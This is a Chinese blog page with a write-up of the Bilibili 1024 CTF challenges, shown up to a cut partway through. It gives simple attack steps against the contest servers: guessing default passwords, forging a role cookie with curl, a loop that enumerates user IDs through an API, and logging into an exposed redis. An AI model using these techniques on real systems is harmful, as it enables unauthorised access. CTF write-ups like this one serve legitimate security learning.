<!DOCTYPE html><html lang="zh-CN"><head><meta name="viewport" content="width=device-width"><meta charset="utf-8"><link rel="alternate" type="application/atom+xml" href="/atom.xml" title="宝硕博客"><meta name="description" content="宝硕博客 —— Baoshuo (@renbaoshuo) 随便写东西的地方，以技术向博文为主，生活向博文为辅。"><meta property="og:site_name" content="宝硕博客"><meta property="og:description" content="宝硕博客 —— Baoshuo (@renbaoshuo) 随便写东西的地方，以技术向博文为主，生活向博文为辅。"><meta name="twitter:site" content="@renbaoshuo"><meta name="twitter:creator" content="@renbaoshuo"><title>Bilibili 1024 节 CTF Write Up - 宝硕博客</title><meta name="keywords" content="[object Object],[object Object]"><meta property="og:type" content="article"><meta property="og:title" content="Bilibili 1024 节 CTF Write Up - 宝硕博客"><meta property="og:url" content="/post/bilibili-1024-ctf-write-up/"><meta property="og:image" content="https://s1.baoshuo.ren/2020/12/01/cZoPxLHXlkFSjrt.jpg"><link rel="canonical" href="/post/bilibili-1024-ctf-write-up/"><meta name="twitter:card" content="summary_large_image"><meta name="next-head-count" content="16"><meta name="darkreader" content="disabled"><meta name="generator" content="Hexo 6.2.0"><script defer="" src="https://cdnjs.baoshuo.ren/ajax/libs/react/18.2.0/umd/react.production.min.js" crossorigin=""></script><script defer="" src="https://cdnjs.baoshuo.ren/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js" crossorigin=""></script><script defer="" nomodule="" src="https://static.cdn.baoshuo.ren/blog/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/chunks/webpack-d03dec103c5ee603.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/chunks/framework-c179c9a670c47eb6.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/chunks/main-d001dfc4b5cb68c2.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/chunks/pages/_app-8df0f06cff2cbf6b.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/chunks/6-edd26cc39383d1b0.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/chunks/pages/post/%5Bslug%5D-8e6125cf83ab44ce.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/k90Ni_4Pr-FWD9VknAbFR/_buildManifest.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/k90Ni_4Pr-FWD9VknAbFR/_ssgManifest.js" defer=""></script><script src="https://static.cdn.baoshuo.ren/blog/_next/static/k90Ni_4Pr-FWD9VknAbFR/_middlewareManifest.js" defer=""></script><style>.eDssNQ{pointer-events:none}.gZmUMJ{height:2px}.hJfaYF{z-index:200}.dJcTkO{box-shadow:0 0 10px var(--c-a),0 0 10px var(--c-a)}.gOeSjL{opacity:1}.fxkyut{transition:all .25s ease-in-out}.kaWzRu{transform:rotate(3deg) translateY(-4px)}.ktTKqx{width:5%}.cdfZWI:before{box-shadow:inset 0 0 32px}.zJreD:before{height:3px}.iSSyDr:before{left:1.5px}.jORRks:before{top:14px}.beaHbQ:before{width:3px}.haKUHj:after{box-sizing:border-box}.feNfPp:after{transform:translate(-50%,-50%)}.qMJeO:after{box-shadow:inset 0 0 0 2px,0 0 0 2px}.dUAgBC:after{height:27.5px}.hVfwnH:after{left:0}.jtnuen:after{top:100%}.iibzBM:after{width:27.5px}.bLLutt:before{height:.8em}.kUNXjX:before{transform:translate(0) rotate(45deg)}.kBZpXt:before{width:.8em}.kCTVgr:after{top:80%}.cDbGzW:after{left:80%}.eHPmEw:after{transform:translate(-50%,-50%) rotate(45deg)}.dmfenB:after{width:.5em}.kAVdUc{font-size:16px}.jLmWnd:before{height:100%}.jYPXoJ:before{top:0}.kKTZiz:before{left:0}.elJZFC:after{height:14px}.eLXBUo:after{width:7px}.ebtDcN:after{top:1px}.caItCN{height:2rem}.jYEAGD{align-items:stretch}.gKQCBv:after{content:"·"}.jbBqfU:before{transform:translate(-50%,-25%) rotate(45deg)}.dhOkuk:before{box-sizing:border-box}.jFCJJY:before{box-shadow:0 -.35em,0 .35em}.iqzSxf:before{transform:translate(-50%,-50%)}.bQvqKh:before{width:100%}.sKExc{right:1rem}.bjOGUo{bottom:1rem}.eSaSrN{contain:layout}.egGyMq{line-height:1}.IVbXa{justify-content:center}.bcjLCN{flex-grow:0}.WhAZY{top:0}.gdPTUr{height:100%}.dYbGIK{flex-grow:0}.bOjOhu{left:0}.ipEZTh{width:95%}.eRVtDl{max-width:var(--w)}.kKplrA{contain:content}.gifdxR{font-size:1.25rem}.laXLGQ{color:var(--c)}.kooHYa{text-align:center}.moyUB{color:#fff}.eAOGpx{user-select:none}.bLHLvQ{text-indent:-9999px}.jXmXEB{height:1em}.hHGIsI{width:1em}.jbzBdl:before{transform:translate(-25%,-50%) rotate(-45deg)}.fIXfpL:before{width:.65em}.ergVCo:before{height:.65em}.cqyuit:before{top:50%}.hCTuXM:before{left:50%}.gvwkfp{font-size:.9em}.bRNbBj{font-weight:500}.fPWmiY{justify-content:flex-start}.hmKFEM{text-align:left}.dQPgRK{flex-grow:1}.fXzCvR{justify-content:flex-end}.klEWBS{text-align:right}.foGVKH{align-items:center}.fygwnR{box-sizing:border-box}.kQBRAp{display:block}.iMyxuR:after{display:block}.bbRNPO:after{left:1px}.imhmwA{position:fixed}.dPAasc{box-shadow:var(--s)}.jqaXfP{z-index:100}.iVncgA::-webkit-scrollbar{height:var(--s-x)}.fQhDyl::-webkit-scrollbar{width:var(--s-y)}.bBVwIW{letter-spacing:1px}.jsvbrX{cursor:pointer}.kroOag{font-size:.9rem}.bEvNbr{position:absolute}.eLDTYY{vertical-align:middle}.iRjWhb{font-size:.925rem}.QcCvg{height:12.25em}.jdKAzd{width:12.25em}.krZeLX{right:-30px}.gjJDYK{top:-40px}.dZDNG{opacity:.1}.julXB:before{content:""}.kvHVCE:before{position:absolute}.fQfkux:before{height:3.75em}.dPenaT:before{width:3.75em}.NpaJd:before{left:1.5625em}.jgAayQ:before{top:3em}.fqXcHQ:after{content:""}.dyMCpl:after{position:absolute}.chpxwD:after{height:3.75em}.beuMzX:after{width:3.75em}.dbtvqd:after{right:1.5625em}.jPcnDC:after{top:3em}.bpQkXn{font-weight:700}.gcQrEv{font-size:.9em}.iMkoWi{flex-direction:column}.chVqDG{font-size:.8em}.fyuAJJ{color:inherit}.jYagCu{max-height:400px}.gWinOH{object-fit:cover}.cypeLb{font-size:1.75rem}.VFfNK{letter-spacing:.75px}.dgIPcR{color:var(--c-m)}.cjScYX{position:relative}.cRUUAa{width:100%}.gSBWlu{display:flex}.kJzccJ{justify-content:space-between}.cpOcAb{display:inline-block}.kpaoc{color:var(--c-s)}.kOZsAO{word-break:keep-all}.jBtqwC{background-color:var(--c-a)}.cTiRpf:after{border-top-left-radius:100px}.kLOwRz:after{border-top-right-radius:100px}.fEOdlm:after{border-bottom-right-radius:100px}.iiCJgG:after{border-bottom-left-radius:100px}.gbJvTx:before{border-top-left-radius:100px}.eqcbDJ:before{border-top-right-radius:100px}.efWRhG:before{border-bottom-right-radius:100px}.ciQIPM:before{border-bottom-left-radius:100px}.jVKJhP:before{border-top-left-radius:1000px}.qOQRo:before{border-top-right-radius:1000px}.ftrJDm:before{border-bottom-right-radius:1000px}.dnkCBy:before{border-bottom-left-radius:1000px}.eCTYLu:after{overflow-x:hidden}.fPEpYf:after{overflow-y:hidden}.fSuxSX:after{border-top-left-radius:1000px}.diZuuN:after{border-bottom-left-radius:1000px}.ihNVbP{flex-basis:0}.KqcXP{background-color:transparent}.eIJBjz{padding-right:.7rem}.hcJOFn{padding-left:.7rem}.iawFZL{margin-right:.4rem}.kswRdL{margin-left:.4rem}.eGElBa{padding-top:2.5rem}.eBrwtd{padding-bottom:4rem}.edKxdA{padding-top:.9rem}.osxXp{padding-right:.9rem}.foquGP{padding-bottom:.9rem}.lhTVEC{padding-left:.9rem}.eQmaZO{padding-top:.6rem}.dZrGlq{padding-bottom:.6rem}.gCwvuy{background-color:var(--g-m)}.dvivnl{overflow-x:auto}.jSOKOm{text-decoration-line:inherit}.bKjKUN{padding-top:.75rem}.jdraHW{margin-right:auto}.eqrBPF{margin-left:auto}.lexxaO{background-color:#946ce6}.ebVilo{border-top-left-radius:.25rem}.kyhYEz{border-top-right-radius:.25rem}.jIkFRm{border-bottom-right-radius:.25rem}.gpptow{border-bottom-left-radius:.25rem}.kMKXDC{padding-top:.25rem}.ftIldC{padding-right:1rem}.jOeduE{padding-bottom:.25rem}.iDuqPI{padding-left:1rem}.kUPESX{margin-left:.5rem}.eKlQYW{flex-shrink:1}.bLlOeF{flex-basis:50%}.hwgZgR:after{background-color:currentColor}.bcfNhz{background-color:var(--g-b)}.kRQsoY{border-top-left-radius:var(--r)}.jBvrhX{border-top-right-radius:var(--r)}.dgtTIu{border-bottom-right-radius:var(--r)}.eXJtsk{border-bottom-left-radius:var(--r)}.llUCyD{overflow-y:auto}.qlVwF::-webkit-scrollbar-thumb{background-color:#b5b5b5}.jOHNtp::-webkit-scrollbar-thumb{border-top-left-radius:var(--r)}.PvULj::-webkit-scrollbar-thumb{border-top-right-radius:var(--r)}.hTxdYE::-webkit-scrollbar-thumb{border-bottom-right-radius:var(--r)}.fUqTQL::-webkit-scrollbar-thumb{border-bottom-left-radius:var(--r)}.kVZHcH{padding-top:0}.cyerGB{margin-top:.5rem}.dSxtaa{margin-right:.5rem}.ctWdVF{border-top-left-radius:50%}.jkGfDR{border-top-right-radius:50%}.bSTogt{border-bottom-right-radius:50%}.hSDpeY{border-bottom-left-radius:50%}.cDxIqC:before{border-top-left-radius:50%}.jpWidM:before{border-top-right-radius:50%}.jzdNVF:before{border-bottom-right-radius:50%}.bPkdhG:before{border-bottom-left-radius:50%}.beJoMJ:after{border-top-left-radius:50%}.iJgiCW:after{border-top-right-radius:50%}.hqUHPA:after{border-bottom-right-radius:50%}.jWWlrr:after{border-bottom-left-radius:50%}.jnGacs{background-color:var(--g-l)}.cvPkWa{padding-bottom:1.25rem}.dUvWpK{overflow-x:hidden}.hRLVFh{overflow-y:hidden}.dLUwcr{text-decoration-line:underline}.kiDYix{flex-wrap:wrap}.hriXhD{flex-shrink:0}.jjryqL{margin-right:1rem}.jTjNVR{margin-top:0}.hNjeNG{margin-bottom:0}.kpCrIt{padding-top:1.25rem}.bMSzLf{padding-right:2rem}.iATxZH{padding-bottom:0}.iigETV{padding-left:2rem}.fClzDx{margin-top:.75rem}.iKck{margin-right:0}.hlBtvm{margin-bottom:.75rem}.bmFLeF{margin-left:0}.dwawJR{padding-right:0}.jQenOz{padding-left:0}.icKiSN{padding-top:1.5rem}.fZMRmg{padding-bottom:1.5rem}.cUXNmd{margin-top:1rem}.biWxPv{margin-bottom:1rem}.bbUXPo{text-decoration-line:none}.dmKgnC{padding-top:.5rem}.cVJMrm{padding-right:.5rem}.dPFrWx{padding-bottom:.5rem}.JxWnH{padding-left:.5rem}.dAseSU:after{border-top-width:4px}.gFfWNi:after{border-right-width:4px}.hQijyr:after{border-bottom-width:4px}.cKXpgz:after{border-left-width:4px}.jxivWg:after{border-top-color:transparent}.eoMfVT:after{border-bottom-color:transparent}.iOXMHb:after{border-left-color:transparent}.dbfKrc:after{border-top-width:2px}.jAobFs{border-top-style:none}.dQbyJV{border-right-style:none}.oTbqa{border-bottom-style:none}.gwsGKP{border-left-style:none}.SeaTL:before{border-top-width:2px}.gjJuRC:before{border-right-width:0}.iWYpgm:before{border-bottom-width:0}.iHkzF:before{border-left-width:2px}.gUiFRX:before{border-top-width:0}.dixaxG:before{border-right-width:2px}.jmWgOv:before{border-bottom-width:2px}.bTanCN:before{border-left-width:0}.gMDOZu{border-top-width:1.125em}.cgEEZJ{border-right-width:1.125em}.gqWyNB{border-bottom-width:1.125em}.ktfQGr{border-left-width:1.125em}.lpnDDz:before{border-top-width:1em}.ebRqqn:before{border-right-width:1em}.bWKMJW:before{border-bottom-width:1em}.eQlDDM:before{border-left-width:1em}.kSnqYR:before{border-top-style:solid}.fgiDpI:before{border-right-style:solid}.eeAUEW:before{border-bottom-style:solid}.ecjlX:before{border-left-style:solid}.bnSwfb:before{border-right-color:transparent}.jMYtKl:after{border-top-width:1em}.blQfIT:after{border-right-width:1em}.lijgUQ:after{border-bottom-width:1em}.ccSWYO:after{border-left-width:1em}.eGyfkC:after{border-top-style:solid}.hhBXzE:after{border-right-style:solid}.iyXZtO:after{border-bottom-style:solid}.jZLyOQ:after{border-left-style:solid}.hZGkn:after{border-right-color:transparent}.FwRrA{border-top-style:solid}.cDIyHz{border-right-style:solid}.hpBjJb{border-bottom-style:solid}.ycSPk{border-left-style:solid}@media (min-width:769px){.dXUryZ{padding-top:0}.dGtUgz{padding-right:1rem}.cQUTzq{padding-bottom:0}.bjXFvo{padding-left:1rem}.jzScEz{padding-top:2.5rem}.hMoAFf{padding-right:3rem}.bccxkr{padding-bottom:4rem}.cgjdEA{padding-left:3rem}.jZOgvY{display:flex}.uUxpw{justify-content:space-between}}@media (max-width:768px){.cElyNr{flex-direction:column}.gwFLA_D{align-items:center}}.cdhcuu:hover{color:var(--c-a)}.fItHnb:hover{background-color:var(--g-n)}*,:after,:before{box-sizing:border-box}html{-moz-tab-size:4;-o-tab-size:4;tab-size:4;line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji}strong{font-weight:bolder}code,pre{font-family:ui-monospace,SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:1em}button{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button{text-transform:none}button{-webkit-appearance:button}:root{--g:#f2f5f8;--g-m:#fff;--g-b:#fff;--g-s:#f6f7f8;--g-p:#f6f8fa;--g-c:rgba(174,184,193,.2);--g-n:rgba(67,90,111,.06);--g-t:#fff;--g-l:#f5f5f5;--g-i:#fff;--g-r:hsla(200,5%,89%,.5);--c:#2f3d4e;--c-a:#0969da;--c-s:#57606a;--c-m:#6f767d;--h6:#57606b;--b:#d8dee4;--b-t:#d0d7de;--r:0.5rem;--s-y:0.5rem;--s-x:0.35rem;--w:1000px;--s:0 4px 10px rgba(0,2,4,.06),0 0 1px rgba(0,2,4,.11);--i:0}@media(max-width:768px){:root{--s-y:0.35rem;--s-x:0.28rem}}@media(prefers-color-scheme:dark){:root:not(.light){color-scheme:dark;--g:#121212;--g-m:#21262d;--g-b:#364151;--g-s:#2f3542;--g-p:#161b22;--g-c:hsla(215,8%,47%,.4);--g-n:#3e4b5e;--g-t:#2f3542;--g-l:#2c343c;--g-i:#3b3b3b;--g-r:rgba(51,61,77,.5);--c:#c9d1d9;--c-a:#58a6ff;--c-s:#8b949e;--c-m:hsla(0,0%,100%,.659);--h6:#8b949e;--b:#757575;--b-t:#5f5f5f;--s:none;--i:1}:root:not(.light) img{filter:brightness(.8)}}body{line-height:1.5;background:var(--g);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,PingFang SC,Hiragino Sans GB,Source Han Sans SC,Noto Sans CJK SC,Microsoft YaHei,WenQuanYi Micro Hei,WenQuanYi Zen Hei,Helvetica Neue,Arial,sans-serif;color:var(--c);overflow-y:scroll}#__next{display:flex;flex-direction:column;justify-content:space-between;min-height:100vh}*{transition:background-color .25s ease-in-out}a{color:var(--c-a);text-decoration:none}#post_markdown__nRdJ1{line-height:1.5;word-wrap:break-word}#post_markdown__nRdJ1>:first-child{margin-top:0!important}#post_markdown__nRdJ1>:last-child{margin-bottom:0!important}#post_markdown__nRdJ1 a{color:var(--c-a);-webkit-text-decoration:underline transparent;text-decoration:underline transparent;text-underline-position:under;transition:-webkit-text-decoration-color 75ms ease-in-out;transition:text-decoration-color 75ms ease-in-out;transition:text-decoration-color 75ms ease-in-out,-webkit-text-decoration-color 75ms ease-in-out}#post_markdown__nRdJ1 a:active,#post_markdown__nRdJ1 a:hover{outline-width:0}#post_markdown__nRdJ1 a:hover{-webkit-text-decoration:underline var(--c-a);text-decoration:underline var(--c-a)}#post_markdown__nRdJ1 strong{font-weight:700}#post_markdown__nRdJ1 img{border-style:none;max-width:100%;box-sizing:content-box}#post_markdown__nRdJ1 h2{margin-top:1.5rem;margin-bottom:1rem;font-weight:700;line-height:1.25}#post_markdown__nRdJ1 h2{font-size:1.5em}#post_markdown__nRdJ1 p{margin-top:0;margin-bottom:.625rem}#post_markdown__nRdJ1 ul{margin-top:0;margin-bottom:0;padding-left:2em}#post_markdown__nRdJ1 li+li{margin-top:.25em}#post_markdown__nRdJ1 code{font-family:ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace;font-size:.75em;margin:0;padding:.2em .4em;background-color:var(--g-c);border-radius:6px}#post_markdown__nRdJ1 pre{padding:1rem;overflow:auto;font-size:.85em;line-height:1.45;background-color:var(--g-p);border-radius:6px;word-wrap:normal}#post_markdown__nRdJ1 pre::-webkit-scrollbar{height:var(--s-x);width:var(--s-y)}#post_markdown__nRdJ1 pre::-webkit-scrollbar-thumb{background:#b5b5b5;border-radius:var(--r)}#post_markdown__nRdJ1 pre code{font-size:100%;display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background:transparent;border:0}#post_markdown__nRdJ1 p,#post_markdown__nRdJ1 pre,#post_markdown__nRdJ1 ul{margin-top:0;margin-bottom:1rem}#post_markdown__nRdJ1 .hljs-keyword{color:#d73a49}#post_markdown__nRdJ1 .hljs-title,#post_markdown__nRdJ1 .hljs-title.function_{color:#6f42c1}#post_markdown__nRdJ1 .hljs-literal,#post_markdown__nRdJ1 .hljs-meta,#post_markdown__nRdJ1 .hljs-number,#post_markdown__nRdJ1 .hljs-variable{color:#005cc5}#post_markdown__nRdJ1 .hljs-string{color:#032f62}#post_markdown__nRdJ1 .hljs-comment{color:#6a737d}</style><link rel="stylesheet" href="https://static.cdn.baoshuo.ren/blog/_next/static/css/3fc16492cd6995f6.css" data-n-g="" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="https://static.cdn.baoshuo.ren/blog/_next/static/css/3fc16492cd6995f6.css"></noscript><link rel="stylesheet" href="https://static.cdn.baoshuo.ren/blog/_next/static/css/1550b18fa9b2cc2d.css" data-n-g="" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="https://static.cdn.baoshuo.ren/blog/_next/static/css/1550b18fa9b2cc2d.css"></noscript><link rel="stylesheet" href="https://static.cdn.baoshuo.ren/blog/_next/static/css/49e3c9be9aebdd02.css" data-n-p="" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="https://static.cdn.baoshuo.ren/blog/_next/static/css/49e3c9be9aebdd02.css"></noscript><noscript data-n-css=""></noscript></head><body><div id="__next"><div class="eDssNQ imhmwA bOjOhu WhAZY cRUUAa gZmUMJ hJfaYF KqcXP "><div class="gdPTUr jBtqwC fxkyut " style="opacity:0;width:0%"><div class="bEvNbr ktTKqx gdPTUr fxkyut dJcTkO gOeSjL kaWzRu " style="left:-5.5%"></div></div></div><div><nav class="gSBWlu kJzccJ gCwvuy eAOGpx dPAasc eSaSrN cjScYX jqaXfP cElyNr gwFLA_D dXUryZ dGtUgz cQUTzq bjXFvo " role="navigation"><a class="gSBWlu bcjLCN hriXhD foGVKH gifdxR bpQkXn fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn bBVwIW " href="/"><svg id="Main" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="caItCN dSxtaa "><path d="M471,256A214.8122,214.8122,0,0,1,256,471a216.4337,216.4337,0,0,1-40.955-3.896A214.86,214.86,0,0,1,41,256,214.9809,214.9809,0,0,1,256,41a214.4584,214.4584,0,0,1,154.4137,65.4129q6.911,7.1214,13.146,14.8661c1.3337,1.6587,2.6413,3.3258,3.9229,5.0281A214.5854,214.5854,0,0,1,471,256Z" fill="#5897d1"></path><path d="M419.2572,204.2572A163.1145,163.1145,0,0,1,256,367.5136a164.3664,164.3664,0,0,1-31.0985-2.9579A163.271,163.271,0,1,1,419.2572,204.2572Z" fill="#9fc5e6"></path><path d="M418.8558,63.0971v44.65A10.5833,10.5833,0,0,1,408.2729,118.33H333.7074V52.5134h74.5655A10.584,10.584,0,0,1,418.8558,63.0971Z" fill="#ff668c"></path><path d="M329.7492,458.0118A215.2574,215.2574,0,0,1,60.2534,345.0537l67.6679-90.0019a30.79,30.79,0,0,1,49.2216,0l38.5328,51.2574Z" fill="#343a6e"></path><path d="M408.6937,77.1989a8.2229,8.2229,0,0,1-8.2229,8.223H371.8716a8.2271,8.2271,0,0,0,0,16.4542h9.8724a8.2271,8.2271,0,1,1,0,16.4542H333.7065V52.5134h46.87a8.2238,8.2238,0,0,1,8.2229,8.2313,8.2246,8.2246,0,0,0,8.2313,8.2229h3.44A8.23,8.23,0,0,1,408.6937,77.1989Z" fill="#ef487d"></path><path d="M328.6658,41.0008h0a7.2391,7.2391,0,0,0-7.2394,7.24V230.2126h14.4789V48.24A7.24,7.24,0,0,0,328.6658,41.0008Z" fill="#f9df73"></path><path d="M454.3619,339.0513q-2.87,6.8317-6.1872,13.4266A215.3468,215.3468,0,0,1,215.045,467.104a214.1378,214.1378,0,0,1-82.1653-34.83L299.2368,211.0171a36.8115,36.8115,0,0,1,58.8571,0Z" fill="#484b7f"></path><path d="M328.67,196.3173c-5.6429,0-11.285,4.8972-15.0584,14.699L215.045,467.104a213.7775,213.7775,0,0,1-82.1653-34.83L299.2461,211.0171A36.578,36.578,0,0,1,328.67,196.3173Z" fill="#343a6e"></path><path d="M448.1747,352.4779A215.3468,215.3468,0,0,1,215.045,467.104a213.4209,213.4209,0,0,1-59.4366-20.9382L264.82,337.7974c-17.0068,44.185,31.1885,55.6372,81.2087,37.2085C391.9237,358.0939,396.8116,340.0692,448.1747,352.4779Z" fill="#343a6e"></path><path d="M215.6766,306.31c-25.6245.886-50.9072,16.0419-67.0884,16.0419-25.0106,0-54.584-22.1845-20.6661-67.2992a30.79,30.79,0,0,1,49.2216,0Z" fill="#484b7f"></path></svg><span>宝硕博客</span></a><div class="gSBWlu jYEAGD dvivnl iVncgA fQhDyl qlVwF jOHNtp PvULj hTxdYE fUqTQL "><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/">首页</a><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/archives/">归档</a><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/categories/">分类</a><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/tags/">标签</a><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/friends/">友链</a><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/about/">关于</a><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/atom.xml"><i class="cpOcAb cjScYX hHGIsI jXmXEB bLHLvQ eLDTYY kAVdUc dUvWpK hRLVFh julXB dhOkuk kvHVCE gbJvTx eqcbDJ efWRhG ciQIPM iqzSxf cdfZWI zJreD iSSyDr jORRks beaHbQ fqXcHQ haKUHj dyMCpl cTiRpf kLOwRz fEOdlm iiCJgG feNfPp dAseSU gFfWNi hQijyr cKXpgz eGyfkC hhBXzE iyXZtO jZLyOQ jxivWg hZGkn eoMfVT iOXMHb qMJeO dUAgBC hVfwnH jtnuen iibzBM "></i></a><a class="gSBWlu bcjLCN hriXhD foGVKH fyuAJJ bbUXPo eQmaZO eIJBjz dZrGlq hcJOFn fItHnb " href="/search/"><i class="fygwnR cpOcAb kAVdUc jXmXEB hHGIsI cjScYX bLHLvQ eLDTYY julXB kvHVCE SeaTL dixaxG jmWgOv iHkzF kSnqYR fgiDpI eeAUEW ecjlX gbJvTx eqcbDJ efWRhG ciQIPM bLLutt kKTZiz jYPXoJ kUNXjX kBZpXt fqXcHQ dyMCpl dbfKrc eGyfkC kCTVgr cDbGzW eHPmEw dmfenB "></i></a><div class="dYbGIK eKlQYW ihNVbP "><button class="jsvbrX gdPTUr gSBWlu foGVKH IVbXa eQmaZO eIJBjz dZrGlq hcJOFn jAobFs dQbyJV oTbqa gwsGKP KqcXP fItHnb "><i class="cpOcAb kAVdUc jXmXEB hHGIsI cjScYX bLHLvQ eLDTYY julXB kvHVCE bQvqKh jLmWnd SeaTL dixaxG jmWgOv iHkzF kSnqYR fgiDpI eeAUEW ecjlX jVKJhP qOQRo ftrJDm dnkCBy jYPXoJ kKTZiz fqXcHQ dyMCpl iMyxuR hwgZgR eCTYLu fPEpYf fSuxSX diZuuN elJZFC eLXBUo ebtDcN bbRNPO "></i></button></div></div></nav><main><article class="gCwvuy kRQsoY jBvrhX dgtTIu eXJtsk dvivnl llUCyD dPAasc ipEZTh eRVtDl cUXNmd jdraHW biWxPv eqrBPF"><img class="cRUUAa jYagCu gWinOH " src="https://s1.baoshuo.ren/2020/12/01/cZoPxLHXlkFSjrt.jpg" alt="Bilibili 1024 节 CTF Write Up"><header class="jTjNVR iKck hNjeNG bmFLeF dmKgnC bMSzLf iATxZH iigETV "><h1 class="fClzDx iKck hlBtvm bmFLeF cypeLb VFfNK ">Bilibili 1024 节 CTF Write Up</h1><div class="dmKgnC dwawJR dPFrWx jQenOz dgIPcR "><time datetime="2020-10-26T10:02:08.000Z">2020-10-26</time><span class="jTjNVR iawFZL hNjeNG kswRdL gKQCBv "></span><a class="fyuAJJ bbUXPo cdhcuu " href="/categories/%E6%8A%80%E6%9C%AF%E5%90%91/">技术向</a><span class="jTjNVR iawFZL hNjeNG kswRdL gKQCBv "></span><span>590 字</span></div></header><section class="jTjNVR iKck hNjeNG bmFLeF bKjKUN bMSzLf fZMRmg iigETV kKplrA " id="post_markdown__nRdJ1"><p>比赛地址： <a href="https://security.bilibili.com/sec1024/" rel="external nofollow noreferrer">https://security.bilibili.com/sec1024/</a></p><h2 id="t1：页面的背后是什么？">T1：页面的背后是什么？</h2><p><s>F12 解决一切问题</s></p><p><img src="https://s1.baoshuo.ren/2020/11/28/XrLpIf2OHs4YAxJ.png" alt="" loading="lazy"></p><h2 id="t2：真正的秘密只有特殊的设备才能看到">T2：真正的秘密只有特殊的设备才能看到</h2><p>改下 UA 就行了，轻松到手</p><p><img src="https://s1.baoshuo.ren/2020/11/28/WPLCUHNYiE2nFwJ.png" alt="" loading="lazy"></p><p><img src="https://s1.baoshuo.ren/2020/11/28/83GrjFbTwJf1BHn.png" alt="" loading="lazy"></p><h2 id="t3：密码是啥？">T3：密码是啥？</h2><p>看了看源码，没啥思路，最后随便试了试 <code>admin</code> <code>root</code> <code>bilibili</code> 什么的，竟然是对的。</p><ul><li>用户名 <code>admin</code></li><li>密码 <code>bilibili</code></li></ul><p>另外，你告诉我什么是 <strong>falg</strong> ？</p><p><img src="https://s1.baoshuo.ren/2020/11/28/eg9kBtR1aQizGYE.png" alt="" loading="lazy"></p><h2 id="t4：对不起，权限不足～">T4：对不起，权限不足～</h2><p>第一次访问：</p><p><img src="https://s1.baoshuo.ren/2020/11/28/roVjXTfs4v8ibP5.png" alt="" loading="lazy"></p><p>第二次访问：</p><p><img src="https://s1.baoshuo.ren/2020/11/28/RpEsGn8c9KY16MH.png" alt="" loading="lazy"></p><p>查看源码可以发现有个 API 请求，查看请求数据得到以下信息。</p><p><img src="https://s1.baoshuo.ren/2020/11/28/nhF7pCTQsVYxKdj.png" alt="" loading="lazy"></p><p>role 里面的东西，贴进谷歌一搜就知道它是 <code>user</code> 的 MD5 。</p><p>和超级管理员相关的名字相信大家都知道，无非就是 <code>admin</code> <code>Administrator</code> <code>root</code> 之类的东西。</p><p>挨个试，最后发现 <code>Administrator</code> 是正确的。</p><pre><code class="hljs shell">curl "http://45.113.201.36/api/ctf/4" --cookie "role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=***;"</code></pre><p><img src="https://s1.baoshuo.ren/2020/11/28/gEhkmTJrnaoMwPv.png" alt="" loading="lazy"></p><h2 id="t5：别人的秘密">T5：别人的秘密</h2><p><img src="https://s1.baoshuo.ren/2020/11/28/c4BjYs3nVuCpxmH.png" alt="" loading="lazy"></p><p>发现有个 API，还有个 UID。</p><p>最开始没想到需要从代码里面的"初始 UID"开始扫，浪费了我好多时间。</p><pre><code class="hljs shell">for ((i=100336889;$i&lt;9999999999;i=($i+1))); do echo -e "[$i] \c" &amp;&amp; curl "http://45.113.201.36/api/ctf/5?uid=${i}" -H 'User-Agent: bilibili Security Browser' -H 'Cookie: session=*****; role=ee11cbb19052e40b07aac0ca060c23ee' ; done</code></pre><p><img src="https://s1.baoshuo.ren/2020/11/28/m1Hr4u8FOJe7ycI.png" alt="" loading="lazy"></p><h2 id="t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～">T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～</h2><p>先扫了扫端口，发现有个 redis</p><p><img src="https://s1.baoshuo.ren/2020/11/28/E29tLxSiC6Qzn5O.png" alt="" loading="lazy"></p><pre><code class="hljs shell">redis-cli -h 120.92.151.189 -p 6379</code></pre><p>登上去看看，发现了第八题的 flag 。</p><p><img src="https://s1.baoshuo.ren/2020/11/28/Oo5vyeEsChmSt2H.png" alt="" loading="lazy"></p><p>然后爆破下目录</p><p><img 